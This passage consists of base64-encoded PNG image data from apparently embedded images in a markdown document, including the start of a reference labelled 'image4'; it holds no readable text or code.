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>

[image4]: <data:image/png;base64,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